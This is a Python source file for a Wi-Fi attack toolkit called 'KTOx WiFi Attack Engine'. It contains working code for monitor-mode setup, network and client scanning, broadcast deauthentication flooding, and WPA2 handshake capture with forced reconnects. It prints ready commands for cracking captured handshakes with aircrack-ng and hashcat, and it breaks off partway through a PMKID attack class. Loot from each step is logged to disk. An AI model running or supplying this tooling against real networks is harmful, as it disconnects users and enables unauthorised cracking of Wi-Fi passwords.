#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# ktox_wifi.py — KTOx WiFi Attack Engine v1.0
#
# Modules:
#   · Monitor Mode Manager   — enable/disable monitor mode on any interface
#   · WiFi Scanner           — passive AP + client discovery
#   · Deauth Attack          — force client disconnection (802.11 deauth frames)
#   · WPA2 Handshake Capture — capture 4-way handshake for offline cracking
#   · PMKID Attack           — clientless WPA2 hash capture (no handshake needed)
#   · Evil Twin AP           — rogue access point with hostapd + dnsmasq
#
# Requirements:
#   aircrack-ng suite:  sudo apt install aircrack-ng
#   hostapd + dnsmasq:  sudo apt install hostapd dnsmasq
#   Python:             scapy (Dot11 layers)

import os, sys, re, time, json, subprocess, threading, shutil, signal, logging, atexit
from datetime import datetime

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def _emergency_restore():
    """
    Last-resort safety net — called by atexit if the process exits
    while monitor mode is still active. Prevents leaving wlan0 broken.
    """
    try:
        if MonitorMode._active:
            import sys
            print("\n[ktox_wifi] Emergency: restoring monitor mode interfaces...",
                  file=sys.stderr)
            MonitorMode.disable_all()
    except: pass

atexit.register(_emergency_restore)

try:
    from rich.console  import Console
    from rich.panel    import Panel
    from rich.table    import Table
    from rich.rule     import Rule
    from rich.prompt   import Prompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich          import box
except ImportError:
    print("ERROR: pip3 install rich"); sys.exit(1)

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11Auth,
        Dot11AssoReq, Dot11AssoResp, Dot11ProbeReq, Dot11ProbeResp,
        RadioTap, sendp, sniff, Ether, EAPOL
    )
    from scapy.config import conf as sconf
except ImportError as e:
    print(f"ERROR: scapy Dot11 layers missing — {e}")
    sys.exit(1)

console  = Console(highlight=False)
loot_dir = "ktox_loot"
stop_flag = threading.Event()

C_BLOOD  = "#C0392B"
C_RUST   = "#922B21"
C_EMBER  = "#E74C3C"
C_STEEL  = "#717D7E"
C_ASH    = "#ABB2B9"
C_WHITE  = "#F2F3F4"
C_DIM    = "#566573"
C_ORANGE = "#CA6F1E"
C_YELLOW = "#D4AC0D"
C_GOOD   = "#1E8449"

def tag(t, c=C_BLOOD): return f"[{c}]{t}[/{c}]"
def ok(t):    console.print(f"  [{C_GOOD}]✔  {t}[/{C_GOOD}]")
def warn(t):  console.print(f"  [{C_ORANGE}]⚠  {t}[/{C_ORANGE}]")
def err(t):   console.print(f"  [{C_BLOOD}]✖  {t}[/{C_BLOOD}]")
def info(t):  console.print(f"  [{C_STEEL}]ℹ  {t}[/{C_STEEL}]")

def section(t):
    console.print()
    console.print(Rule(f"[bold {C_BLOOD}] {t} [/bold {C_BLOOD}]", style=C_RUST))
    console.print()

def _loot(event, data):
    os.makedirs(loot_dir, exist_ok=True)
    path  = os.path.join(loot_dir, "wifi.log")
    entry = {"ts": datetime.now().isoformat(), "event": event, "data": data}
    try:
        with open(path, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except: pass

def _run(cmd, **kwargs):
    return subprocess.run(cmd, capture_output=True, text=True, **kwargs)

def _check_tools():
    """Check which wireless tools are available."""
    tools = {
        "airmon-ng":   shutil.which("airmon-ng"),
        "airodump-ng": shutil.which("airodump-ng"),
        "aireplay-ng": shutil.which("aireplay-ng"),
        "aircrack-ng": shutil.which("aircrack-ng"),
        "hostapd":     shutil.which("hostapd"),
        "dnsmasq":     shutil.which("dnsmasq"),
        "iw":          shutil.which("iw"),
        "iwconfig":    shutil.which("iwconfig"),
    }
    return tools

def _get_wireless_interfaces():
    """List available wireless interfaces."""
    ifaces = []
    try:
        result = _run(["iw", "dev"])
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("Interface"):
                    ifaces.append(line.split()[1])
    except: pass

    if not ifaces:
        # fallback: parse /proc/net/dev
        try:
            with open("/proc/net/dev") as f:
                for line in f:
                    name = line.split(":")[0].strip()
                    if name.startswith("wlan") or name.startswith("wlp") or name.startswith("ath"):
                        ifaces.append(name)
        except: pass

    return ifaces


# ══════════════════════════════════════════════════════════════════════════════
# ── MONITOR MODE MANAGER ──────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class MonitorMode:
    """
    Monitor mode manager based on WifiManager pattern.
    Simple: airmon-ng check kill → airmon-ng start → verify by scanning iw dev.
    Includes watchdog and auto-recovery for interface crashes.
    """

    _active = {}  # registry: original_iface -> instance

    def __init__(self, iface):
        self.iface      = iface        # base interface (wlan0, wlan1...)
        self._original  = iface
        self.mon_iface  = None         # monitor interface (wlan0mon...)
        self._phy       = None
        self._nm_killed = False
        self.driver     = None
        self.is_nexmon  = False

    # ── Hardware detection ─────────────────────────────────────────────────

    def detect_hardware(self):
        """Detect driver and whether this is a Nexmon/brcmfmac interface."""
        try:
            r = _run(["ethtool", "-i", self.iface])
            if r.returncode == 0:
                m = re.search(r"driver:\s*(\S+)", r.stdout)
                if m:
                    self.driver = m.group(1)
                    if "brcmfmac" in self.driver:
                        self.is_nexmon = True
                        info(f"brcmfmac/Nexmon detected on {self.iface} (Pi internal Wi-Fi)")
                    else:
                        info(f"Driver: {self.driver} (external adapter)")
        except Exception:
            pass

    def get_interfaces(self):
        """Return list of all current wireless interface names."""
        result = _run(["iw", "dev"])
        return re.findall(r"Interface\s+(\w+)", result.stdout)

    def _get_phy(self, iface=None):
        target = iface or self.iface
        result = _run(["iw", "dev"])
        current_phy = None
        for line in result.stdout.splitlines():
            stripped = line.strip()
            if line.startswith("phy#"):
                current_phy = line.split()[0].replace("#", "")
            elif stripped.startswith("Interface") and current_phy:
                if stripped.split()[1] == target:
                    return current_phy
        return None

    def _get_mode(self, iface=None):
        target = iface or self.iface
        result = _run(["iw", "dev", target, "info"])
        if result.returncode == 0:
            m = re.search(r"^\s+type\s+(\S+)", result.stdout, re.M)
            return m.group(1) if m else "unknown"
        result2 = _run(["iw", "dev"])
        current = None
        for line in result2.stdout.splitlines():
            s = line.strip()
            if s.startswith("Interface"):
                current = s.split()[1]
            if s.startswith("type") and current == target:
                return s.split()[1]
        return "unknown"

    def detect_monitor_interface(self):
        """
        Scan all wireless interfaces for one actually in monitor mode.
        Checks via 'iw dev <iface> info' — handles any naming scheme.
        """
        for iface in self.get_interfaces():
            if self._get_mode(iface) == "monitor":
                return iface
        return None

    # ── Health check + recovery ────────────────────────────────────────────

    def interface_alive(self):
        """Check if the monitor interface actually exists in iw dev."""
        if not self.mon_iface:
            return False
        return self.mon_iface in self.get_interfaces()

    def recover_interface(self):
        """
        Recovery procedure when monitor interface crashes.
        Stops monitor mode, bounces the base interface, retries.
        """
        warn(f"Attempting interface recovery for {self.iface}...")

        if self.mon_iface:
            _run(["airmon-ng", "stop", self.mon_iface])
            self.mon_iface = None

        if self.iface:
            _run(["ip", "link", "set", self.iface, "down"])
            time.sleep(0.5)
            _run(["ip", "link", "set", self.iface, "up"])

        time.sleep(2)
        info("Re-enabling monitor mode...")
        return self.enable()

    def watchdog(self):
        """
        Call this inside scan/attack loops to detect and recover from crashes.
        Returns True if interface is healthy, False if recovery was needed.
        """
        if not self.interface_alive():
            warn(f"Interface {self.mon_iface} crashed — recovering...")
            self.recover_interface()
            return False
        return True

    # ── Enable / disable ───────────────────────────────────────────────────

    def enable(self):
        """
        Enable monitor mode.
          1. airmon-ng check kill
          2. airmon-ng start <iface>
          3. Detect monitor interface by scanning for *mon interfaces
          4. Fallback to iw if airmon-ng not available
        """
        tools = _check_tools()

        # Unblock rfkill soft blocks
        if shutil.which("rfkill"):
            r = _run(["rfkill", "list"])
            if "Soft blocked: yes" in r.stdout:
                _run(["rfkill", "unblock", "wifi"])
                time.sleep(0.3)

        self.detect_hardware()
        self._phy = self._get_phy(self.iface)

        # Already in monitor mode?
        if self._get_mode() == "monitor":
            self.mon_iface = self.iface
            warn(f"{self.iface} is already in monitor mode.")
            MonitorMode._active[self._original] = self
            return self.mon_iface

        if tools["airmon-ng"]:
            info("Killing conflicting processes...")
            _run(["airmon-ng", "check", "kill"])
            self._nm_killed = True
            time.sleep(1)  # Give kernel time to settle after service kills

            # airmon-ng check kill can bring the interface DOWN — restore it
            _run(["ip", "link", "set", self.iface, "up"])
            time.sleep(0.3)

            info(f"Starting monitor mode on {self.iface}...")
            _run(["airmon-ng", "start", self.iface])

            time.sleep(2)

            # Detect by scanning for *mon interfaces — not by parsing text
            self.mon_iface = self.detect_monitor_interface()

            if not self.mon_iface:
                warn("Monitor mode failed — attempting recovery...")
                result = self.recover_interface()
                if not result:
                    err("Could not enable monitor mode.")
                    return self.iface
                return result

            ok(f"Monitor active: {self.mon_iface}")
            _loot("MONITOR_ENABLE", {"iface": self.iface, "mon": self.mon_iface, "method": "airmon-ng"})
            MonitorMode._active[self._original] = self
            return self.mon_iface

        # ── iw fallback (no airmon-ng) ─────────────────────────────────────
        _run(["systemctl", "stop", "NetworkManager"])
        _run(["systemctl", "stop", "wpa_supplicant"])
        _run(["killall", "-q", "wpa_supplicant"])
        self._nm_killed = True
        time.sleep(1)

        # Restore interface after service kills may bring it down
        _run(["ip", "link", "set", self.iface, "up"])
        time.sleep(0.3)

        if not self._phy:
            err(f"Cannot find PHY for {self.iface}")
            return self.iface

        mon_name = self.iface + "mon"
        stale = self.detect_monitor_interface()
        if stale:
            _run(["ip", "link", "set", stale, "down"])
            _run(["iw", "dev", stale, "del"])
            time.sleep(0.3)

        # Strategy 1: add a new virtual monitor interface
        r = _run(["iw", self._phy, "interface", "add", mon_name, "type", "monitor"])
        if r.returncode == 0:
            _run(["ip", "link", "set", mon_name, "up"])
            time.sleep(0.3)
            if self._get_mode(mon_name) == "monitor":
                self.mon_iface = mon_name
                ok(f"Monitor mode enabled (iw add) → {self.mon_iface}")
                _loot("MONITOR_ENABLE", {"iface": self.iface, "mon": self.mon_iface, "method": "iw-add"})
                MonitorMode._active[self._original] = self
                return self.mon_iface

        # Strategy 2: set existing interface type to monitor
        _run(["ip", "link", "set", self.iface, "down"])
        time.sleep(0.2)
        r2 = _run(["iw", "dev", self.iface, "set", "type", "monitor"])
        _run(["ip", "link", "set", self.iface, "up"])
        time.sleep(0.5)
        if self._get_mode(self.iface) == "monitor":
            self.mon_iface = self.iface
            ok(f"Monitor mode enabled (iw set) → {self.mon_iface}")
            _loot("MONITOR_ENABLE", {"iface": self.iface, "mon": self.mon_iface, "method": "iw-set"})
            MonitorMode._active[self._original] = self
            return self.mon_iface

        # Strategy 3: iw phy set monitor none
        _run(["ip", "link", "set", self.iface, "down"])
        time.sleep(0.2)
        r3 = _run(["iw", "phy", self._phy, "set", "monitor", "none"])
        _run(["ip", "link", "set", self.iface, "up"])
        time.sleep(0.5)
        if self._get_mode(self.iface) == "monitor":
            self.mon_iface = self.iface
        elif self.detect_monitor_interface():
            self.mon_iface = self.detect_monitor_interface()
        else:
            err("All iw strategies failed.")
            return self.iface

        ok(f"Monitor mode enabled (iw) → {self.mon_iface}")
        _loot("MONITOR_ENABLE", {"iface": self.iface, "mon": self.mon_iface, "method": "iw"})
        MonitorMode._active[self._original] = self
        return self.mon_iface

    def disable(self):
        """Stop monitor mode and restart NetworkManager."""
        tools = _check_tools()
        iface = self.mon_iface or self.iface

        if tools["airmon-ng"]:
            _run(["airmon-ng", "stop", iface])
        else:
            if iface != self._original:
                _run(["ip", "link", "set", iface, "down"])
                _run(["iw", "dev", iface, "del"])
                time.sleep(0.2)
            if self._phy and self._get_mode(self._original) == "unknown":
                _run(["iw", self._phy, "interface", "add", self._original, "type", "managed"])
            else:
                _run(["ip", "link", "set", self._original, "down"])
                _run(["iw", "dev", self._original, "set", "type", "managed"])
            _run(["ip", "link", "set", self._original, "up"])

        if self._nm_killed:
            info("Restarting NetworkManager...")
            r = _run(["systemctl", "start", "NetworkManager"])
            if r.returncode != 0:
                _run(["service", "NetworkManager", "restart"])
            ok("NetworkManager restarted.")
            self._nm_killed = False

        self.mon_iface = None
        MonitorMode._active.pop(self._original, None)
        ok(f"Interface restored → {self._original} (managed)")
        _loot("MONITOR_DISABLE", {"mon": iface, "restored": self._original})

    def set_channel(self, channel):
        iface = self.mon_iface or self.iface
        r = _run(["iw", "dev", iface, "set", "channel", str(channel)])
        if r.returncode == 0: return True
        if self._phy:
            r2 = _run(["iw", self._phy, "set", "channel", str(channel)])
            if r2.returncode == 0: return True
        return False

    @classmethod
    def disable_all(cls):
        for orig, instance in list(cls._active.items()):
            try:
                instance.disable()
            except Exception as e:
                warn(f"Failed to restore {orig}: {e}")
        cls._active.clear()


class WiFiScanner:
    """
    WiFi scanner using airodump-ng + CSV parsing.
    Runs airodump-ng in the background writing to /tmp/ktox_scan-01.csv,
    parses it every 2 seconds for live updates, with channel hopping and
    a watchdog thread to detect interface crashes.
    """

    OUTPUT_PREFIX = "/tmp/ktox_scan"

    def __init__(self, mon_iface, monitor_instance=None):
        self.iface        = mon_iface
        self.monitor      = monitor_instance  # MonitorMode for watchdog/recovery
        self.networks     = {}   # bssid → network dict
        self.clients      = {}   # station_mac → client dict
        self.running      = False
        self._scan_thread = None
        self._hop_thread  = None
        self._watch_thread= None
        self._airodump_proc = None

    # ── Channel hopping ────────────────────────────────────────────────────

    def _channel_hopper(self):
        channels = list(range(1, 14)) + [36, 40, 44, 48, 52, 56, 60, 64,
                                          100, 104, 108, 112, 116, 132, 136,
                                          140, 149, 153, 157, 161, 165]
        idx = 0
        while self.running:
            ch = channels[idx % len(channels)]
            subprocess.call(
                ["iwconfig", self.iface, "channel", str(ch)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            idx += 1
            time.sleep(0.5)

    # ── airodump-ng scan loop ──────────────────────────────────────────────

    def _scan_loop(self):
        # Clean up any leftover files from previous run
        for ext in ["-01.csv", "-01.cap", "-01.kismet.csv",
                    "-01.kismet.netxml", "-01.log.csv"]:
            try:
                os.remove(self.OUTPUT_PREFIX + ext)
            except FileNotFoundError:
                pass

        self._airodump_proc = subprocess.Popen(
            ["airodump-ng",
             "--write",         self.OUTPUT_PREFIX,
             "--output-format", "csv",
             self.iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        csv_file = self.OUTPUT_PREFIX + "-01.csv"

        try:
            while self.running:
                time.sleep(2)

                if self._airodump_proc.poll() is not None:
                    err("airodump-ng process died unexpectedly")
                    self.running = False
                    break

                if os.path.exists(csv_file):
                    self._parse_csv(csv_file)

        finally:
            if self._airodump_proc.poll() is None:
                self._airodump_proc.terminate()
                try:
                    self._airodump_proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    self._airodump_proc.kill()

    # ── CSV parsing ────────────────────────────────────────────────────────

    def _parse_csv(self, filepath):
        """
        Parse airodump-ng CSV. Format has two sections:
          APs:     BSSID, First time seen, Last time seen, channel, Speed,
                   Privacy, Cipher, Authentication, Power, # beacons,
                   # IV, LAN IP, ID-length, ESSID, Key
          Clients: Station MAC, First time seen, Last time seen, Power,
                   # packets, BSSID, Probed ESSIDs
        """
        try:
            with open(filepath, newline="",
                      encoding="utf-8", errors="ignore") as f:
                reader = csv.reader(f)
                parsing_ap = True

                for row in reader:
                    row = [c.strip() for c in row]

                    # Switch to client section
                    if row and row[0] == "Station MAC":
                        parsing_ap = False
                        continue

                    if parsing_ap:
                        if len(row) < 14: continue
                        bssid = row[0]
                        if not bssid or bssid == "BSSID": continue

                        # Normalise encryption string
                        enc = row[5]
                        if "WPA2" in enc:    enc = "WPA2"
                        elif "WPA" in enc:   enc = "WPA"
                        elif "WEP" in enc:   enc = "WEP"
                        else:               enc = "OPEN"

                        existing = self.networks.get(bssid)
                        net = {
                            "bssid":      bssid,
                            "ssid":       row[13] or "<hidden>",
                            "channel":    row[3],
                            "signal":     row[8],
                            "encryption": enc,
                            "clients":    existing["clients"] if existing else set(),
                        }

                        if not existing:
                            self.networks[bssid] = net
                            color = C_BLOOD if enc in ("WPA2","WPA") else \
                                    C_ORANGE if enc == "WEP" else C_GOOD
                            console.print(
                                f"  [{C_YELLOW}]AP[/{C_YELLOW}]  "
                                f"[{C_WHITE}]{net['ssid']:28s}[/{C_WHITE}]  "
                                f"[{C_STEEL}]{bssid}[/{C_STEEL}]  "
                                f"ch[{C_DIM}]{net['channel']:>3}[/{C_DIM}]  "
                                f"[{color}]{enc:<5}[/{color}]  "
                                f"[{C_DIM}]{net['signal']} dBm[/{C_DIM}]"
                            )
                            _loot("WIFI_AP", {
                                "ssid": net["ssid"], "bssid": bssid,
                                "channel": net["channel"], "crypto": enc
                            })
                        else:
                            self.networks[bssid].update(net)

                    else:
                        # Client row
                        if len(row) < 6: continue
                        mac = row[0]
                        if not mac or mac == "Station MAC": continue

                        ap_bssid = row[5]
                        probing  = row[6] if len(row) > 6 else ""
                        signal   = row[3]

                        if mac not in self.clients:
                            self.clients[mac] = {
                                "mac":      mac,
                                "bssid":    ap_bssid,
                                "probing":  probing,
                                "signal":   signal,
                            }
                            console.print(
                                f"  [{C_STEEL}]CLIENT[/{C_STEEL}]  "
                                f"[{C_ASH}]{mac}[/{C_ASH}]  "
                                f"→ [{C_WHITE}]{ap_bssid or '<not assoc>'}[/{C_WHITE}]  "
                                f"[{C_DIM}]{probing[:24]}[/{C_DIM}]"
                            )
                        else:
                            self.clients[mac].update({
                                "bssid": ap_bssid,
                                "probing": probing,
                                "signal": signal,
                            })

                        # Link client to AP
                        if ap_bssid and ap_bssid in self.networks:
                            self.networks[ap_bssid]["clients"].add(mac)

        except Exception as ex:
            warn(f"CSV parse error: {ex}")

    # ── Watchdog ───────────────────────────────────────────────────────────

    def _watchdog(self):
        while self.running:
            time.sleep(5)
            try:
                out = subprocess.check_output(["iw", "dev"],
                                              stderr=subprocess.DEVNULL).decode()
                if self.iface not in out:
                    warn(f"Interface {self.iface} lost — stopping scan")
                    self.running = False
                    if self._airodump_proc and self._airodump_proc.poll() is None:
                        self._airodump_proc.terminate()
            except Exception:
                pass

    # ── Public API ─────────────────────────────────────────────────────────

    def start(self):
        """Start scanning in background threads (non-blocking)."""
        if not shutil.which("airodump-ng"):
            err("airodump-ng not found. Install: sudo apt install aircrack-ng")
            return False
        self.running = True
        self._scan_thread  = threading.Thread(target=self._scan_loop,      daemon=True)
        self._hop_thread   = threading.Thread(target=self._channel_hopper, daemon=True)
        self._watch_thread = threading.Thread(target=self._watchdog,       daemon=True)
        self._scan_thread.start()
        self._hop_thread.start()
        self._watch_thread.start()
        return True

    def stop(self):
        """Stop all threads and airodump-ng."""
        self.running = False
        if self._airodump_proc and self._airodump_proc.poll() is None:
            self._airodump_proc.terminate()

    def scan(self, duration=30):
        """Blocking scan for duration seconds. Prints live results, shows table at end."""
        if not shutil.which("airodump-ng"):
            err("airodump-ng not found. Install: sudo apt install aircrack-ng")
            return {}, {}

        section("WiFi SCANNER")
        info(f"Scanning {self.iface} for {duration}s via airodump-ng...")
        info("Ctrl+C to stop early.\n")

        # Verify monitor interface alive
        if self.monitor and not self.monitor.interface_alive():
            warn("Monitor interface not alive — attempting recovery...")
            self.monitor.recover_interface()
            self.iface = self.monitor.mon_iface

        if not self.start():
            return {}, {}

        try:
            for _ in range(duration):
                if not self.running:
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            pass

        self.stop()
        self._show_results()
        return self.networks, self.clients

    def _show_results(self):
        section("SCAN RESULTS")

        if not self.networks:
            warn("No networks found. Ensure interface is in monitor mode.")
            return

        table = Table(
            box=box.SIMPLE_HEAD, border_style=C_RUST,
            header_style=f"bold {C_BLOOD}", padding=(0, 1)
        )
        table.add_column("#",       style=C_DIM,    width=4)
        table.add_column("SSID",    style=C_WHITE,  width=26)
        table.add_column("BSSID",   style=C_STEEL,  width=18)
        table.add_column("CH",      style=C_DIM,    width=4)
        table.add_column("ENC",     style=C_EMBER,  width=6)
        table.add_column("SIGNAL",  style=C_ASH,    width=8)
        table.add_column("CLIENTS", style=C_YELLOW, width=8)

        for i, (bssid, net) in enumerate(self.networks.items()):
            enc   = net["encryption"]
            color = C_BLOOD if enc in ("WPA2","WPA") else \
                    C_ORANGE if enc == "WEP" else C_GOOD
            table.add_row(
                str(i + 1),
                net["ssid"][:25],
                bssid,
                str(net["channel"]),
                f"[{color}]{enc}[/{color}]",
                f"{net['signal']} dBm",
                str(len(net["clients"]))
            )

        console.print(table)
        console.print(
            f"\n  [{C_STEEL}]{len(self.networks)} network(s)  "
            f"{len(self.clients)} client(s)[/{C_STEEL}]"
        )




# ══════════════════════════════════════════════════════════════════════════════
# ── DEAUTH ATTACK ─────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class DeauthAttack:
    """
    Sends 802.11 deauthentication frames to force client(s) off an AP.
    Can target a specific client or broadcast-deauth all clients from an AP.
    Used to force WPA handshake capture (client will reconnect → capture 4-way).
    """

    def __init__(self, mon_iface, bssid, client="ff:ff:ff:ff:ff:ff",
                 channel=1, count=64, interval=0.1, monitor_instance=None):
        self.iface    = mon_iface
        self.bssid    = bssid
        self.client   = client
        self.channel  = channel
        self.count    = count
        self.interval = interval
        self.monitor  = monitor_instance  # MonitorMode for watchdog

    def _build_frame(self, src, dst, bssid):
        return (
            RadioTap() /
            Dot11(type=0, subtype=12,
                  addr1=dst, addr2=src, addr3=bssid) /
            Dot11Deauth(reason=7)
        )

    def attack(self):
        section("DEAUTH ATTACK")

        target_desc = (self.client if self.client != "ff:ff:ff:ff:ff:ff"
                       else "ALL CLIENTS (broadcast)")

        console.print(Panel(
            f"  {tag('AP BSSID:',  C_BLOOD)}   [{C_WHITE}]{self.bssid}[/{C_WHITE}]\n"
            f"  {tag('Target:',    C_BLOOD)}    [{C_EMBER}]{target_desc}[/{C_EMBER}]\n"
            f"  {tag('Channel:',   C_STEEL)}    [{C_ASH}]{self.channel}[/{C_ASH}]\n"
            f"  {tag('Packets:',   C_STEEL)}    [{C_ASH}]{'∞' if not self.count else self.count}[/{C_ASH}]\n\n"
            f"  [{C_DIM}]Ctrl+C to stop[/{C_DIM}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ DEAUTH[/bold {C_BLOOD}]",
            padding=(1,2)
        ))

        _run(["iw", self.iface, "set", "channel", str(self.channel)])

        frame_ap_to_client = self._build_frame(self.bssid, self.client, self.bssid)
        frame_client_to_ap = self._build_frame(self.client, self.bssid, self.bssid)

        sent    = 0
        stop_flag.clear()

        try:
            while not stop_flag.is_set():
                # Watchdog — recover if interface crashed
                if self.monitor and sent % 50 == 0 and sent > 0:
                    if not self.monitor.interface_alive():
                        warn("Interface crashed during deauth — recovering...")
                        self.monitor.recover_interface()
                        self.iface = self.monitor.mon_iface
                        _run(["iw", self.iface, "set", "channel", str(self.channel)])

                sendp(frame_ap_to_client, iface=self.iface, verbose=False, count=1)
                sendp(frame_client_to_ap, iface=self.iface, verbose=False, count=1)
                sent += 2

                if sent % 20 == 0:
                    console.print(
                        f"  [{C_DIM}]Sent {sent} deauth frames[/{C_DIM}]",
                        end="\r"
                    )

                if self.count and sent >= self.count:
                    break

                time.sleep(self.interval)

        except KeyboardInterrupt:
            pass

        console.print()
        ok(f"Deauth complete — {sent} frames sent.")
        _loot("DEAUTH_ATTACK", {
            "bssid": self.bssid, "client": self.client,
            "channel": self.channel, "sent": sent
        })


# ══════════════════════════════════════════════════════════════════════════════
# ── WPA2 HANDSHAKE CAPTURE ────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class HandshakeCapture:
    """
    Captures WPA2 4-way EAPOL handshake passively.
    Optionally fires deauth frames to force reconnection.
    Saves handshake to .cap file for cracking with aircrack-ng or hashcat.
    """

    def __init__(self, mon_iface, bssid, ssid="", channel=1,
                 output_dir=None, auto_deauth=True):
        self.iface       = mon_iface
        self.bssid       = bssid.lower()
        self.ssid        = ssid
        self.channel     = channel
        self.output_dir  = output_dir or loot_dir
        self.auto_deauth = auto_deauth
        self._frames     = []    # captured EAPOL frames
        self._captured   = False
        self._pcap_path  = None

    def _is_handshake_frame(self, pkt):
        """Check if packet is part of WPA2 4-way handshake."""
        if not pkt.haslayer(EAPOL): return False
        # Must be from/to our target BSSID
        addrs = [
            getattr(pkt[Dot11], "addr1", ""),
            getattr(pkt[Dot11], "addr2", ""),
            getattr(pkt[Dot11], "addr3", ""),
        ]
        return self.bssid in [a.lower() if a else "" for a in addrs]

    def _handle(self, pkt):
        if not self._is_handshake_frame(pkt): return

        self._frames.append(pkt)
        frame_num = len(self._frames)
        ts = datetime.now().strftime("%H:%M:%S")

        console.print(
            f"  [{C_GOOD}]⚡ EAPOL frame {frame_num} captured[/{C_GOOD}]  "
            f"[{C_DIM}]{ts}[/{C_DIM}]"
        )

        # A complete handshake needs frames 1+2 or 2+3 (minimum pair)
        if frame_num >= 2 and not self._captured:
            console.print(
                f"\n  [{C_BLOOD}]⚡ WPA2 HANDSHAKE CAPTURED[/{C_BLOOD}]  "
                f"[{C_WHITE}]{self.ssid or self.bssid}[/{C_WHITE}]"
            )
            self._captured = True
            stop_flag.set()

    def capture(self, timeout=60):
        """Capture handshake, optionally sending deauth to force it."""
        section("WPA2 HANDSHAKE CAPTURE")

        console.print(Panel(
            f"  {tag('Target SSID:',  C_BLOOD)}  [{C_WHITE}]{self.ssid or '<unknown>'}[/{C_WHITE}]\n"
            f"  {tag('BSSID:',        C_STEEL)}  [{C_ASH}]{self.bssid}[/{C_ASH}]\n"
            f"  {tag('Channel:',      C_STEEL)}  [{C_ASH}]{self.channel}[/{C_ASH}]\n"
            f"  {tag('Auto deauth:',  C_STEEL)}  [{C_ASH}]{'YES — forces reconnect' if self.auto_deauth else 'NO — passive only'}[/{C_ASH}]\n"
            f"  {tag('Timeout:',      C_DIM)}    [{C_DIM}]{timeout}s[/{C_DIM}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ HANDSHAKE CAPTURE[/bold {C_BLOOD}]",
            padding=(1,2)
        ))

        # Set channel
        _run(["iw", self.iface, "set", "channel", str(self.channel)])
        stop_flag.clear()

        # Fire deauth after 3 seconds to force reconnection
        if self.auto_deauth:
            def _delayed_deauth():
                time.sleep(3)
                if not stop_flag.is_set():
                    info("Sending deauth to force client reconnection...")
                    deauth = DeauthAttack(
                        self.iface, self.bssid,
                        channel=self.channel, count=8
                    )
                    deauth.attack()
            threading.Thread(target=_delayed_deauth, daemon=True).start()

        info("Waiting for EAPOL handshake frames...")

        try:
            sniff(
                iface=self.iface,
                prn=self._handle,
                store=True,
                timeout=timeout,
                stop_filter=lambda _: stop_flag.is_set(),
                lfilter=lambda p: p.haslayer(Dot11)
            )
        except KeyboardInterrupt:
            stop_flag.set()

        if self._frames:
            self._save_cap()

        if self._captured:
            console.print(Panel(
                f"  [{C_GOOD}]Handshake saved → {self._pcap_path}[/{C_GOOD}]\n\n"
                f"  [{C_YELLOW}]Crack with aircrack-ng:[/{C_YELLOW}]\n"
                f"  [{C_DIM}]aircrack-ng {self._pcap_path} "
                f"-w /usr/share/wordlists/rockyou.txt[/{C_DIM}]\n\n"
                f"  [{C_YELLOW}]Convert + crack with hashcat (-m 22000):[/{C_YELLOW}]\n"
                f"  [{C_DIM}]hcxpcapngtool -o hash.hc22000 {self._pcap_path}\n"
                f"  hashcat -m 22000 hash.hc22000 wordlist.txt[/{C_DIM}]",
                border_style=C_GOOD,
                title=f"[bold {C_GOOD}]◈ HANDSHAKE CAPTURED[/bold {C_GOOD}]",
                padding=(1,2)
            ))
        else:
            warn(f"No handshake captured in {timeout}s. "
                 "Try increasing timeout or enabling auto-deauth.")

        return self._captured, self._pcap_path

    def _save_cap(self):
        """Write captured frames to .cap file."""
        from scapy.all import PcapWriter
        os.makedirs(self.output_dir, exist_ok=True)
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        name = re.sub(r'[^\w-]', '_', self.ssid or self.bssid)
        self._pcap_path = os.path.join(
            self.output_dir, f"handshake_{name}_{ts}.cap"
        )
        try:
            writer = PcapWriter(self._pcap_path, append=False, sync=True)
            for frame in self._frames:
                writer.write(frame)
            writer.close()
            ok(f"Capture saved → {self._pcap_path}")
            _loot("HANDSHAKE_SAVED", {
                "ssid": self.ssid, "bssid": self.bssid,
                "file": self._pcap_path, "frames": len(self._frames)
            })
        except Exception as e:
            err(f"Save failed: {e}")


# ══════════════════════════════════════════════════════════════════════════════
# ── PMKID ATTACK ──────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class PMKIDAttack:
    """
    Clientless WPA2/WPA3 attack. Captures PMKID from the AP's first EAPOL
    frame during association — no client needs to be connected.
    The PMKID is derived from: HMAC-SHA1(PMK, 'PMK Name' + AP_MAC + STA_MAC)
    Can be cracked offline without a full handshake.

    Uses hcxdumptool if available, otherwise scapy association approach.
    """

    PMKID_SIG = bytes.fromhex("4f9f2c0ebd4800000000000000000000")

    def __init__(self, mon_iface, bssid, channel=1):
        self.iface   = mon_iface
        self.bssid   = bssid.lower()
        self.channel = channel
        self._pmkids = []

    def _extract_pmkid(self, pkt):
        """Extract PMKID from EAPOL frame if present."""
        if not pkt.haslayer(EAPOL): return None

        try:
            raw = bytes(pkt[EAPOL])
            # PMKID is 16 bytes, found after RSN IE in association response
            # or in the EAPOL key frame after the key data
            # Look for PMKID KDE: 00-0F-AC:04
            kde_marker = bytes.fromhex("000fac04")
            idx = raw.find(kde_marker)
            if idx >= 0 and len(raw) > idx + 4 + 16:
                pmkid = raw[idx+4:idx+20]
                return pmkid.hex()
        except: pass
        return None

    def _handle(self, pkt):
        if not pkt.haslayer(Dot11): return

        addrs = [
            getattr(pkt[Dot11], "addr1", "") or "",
            getattr(pkt[Dot11], "addr2", "") or "",
            getattr(pkt[Dot11], "addr3", "") or "",
        ]
        if self.bssid not in [a.lower() for a in addrs]: return

